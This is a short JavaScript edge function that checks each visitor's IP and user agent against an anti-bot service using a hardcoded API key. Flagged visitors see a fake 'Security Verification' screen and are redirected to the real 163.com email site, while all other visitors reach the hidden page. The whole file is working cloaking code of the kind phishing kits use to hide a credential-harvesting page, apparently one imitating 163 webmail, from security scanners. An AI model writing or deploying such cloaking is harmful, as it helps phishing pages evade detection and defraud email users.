export default async (request, context) => {
  const apiKey = "5a9f4ae09c4daabb43a8c8e126e7591e";
  const botUrl = "https://email.163.com/";
  
  const ip = context.ip;
  const ua = request.headers.get("user-agent") || "";

  try {
    const check = await fetch(`https://xantibot.net/api/ip-antibot?apikey=${apiKey}&ip=${ip}&useragent=${encodeURIComponent(ua)}`);
    const result = await check.json();

    if (result?.data?.is_blocked === 1) {
      // INSTEAD OF 302, return an HTML "Loading" screen
      return new Response(`
        <html>
          <head>
            <meta http-equiv="refresh" content="3;url=${botUrl}">
            <title>Security Verification</title>
            <style>
              body { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; background: #fff; }
              .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
              @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            </style>
          </head>
          <body>
            <div class="spinner"></div>
            <p>Verifying connection...</p>
          </body>
        </html>
      `, {
        headers: { "content-type": "text/html" },
      });
    }

    // If human, continue normally
    return context.next();

  } catch (error) {
    return context.next();
  }
};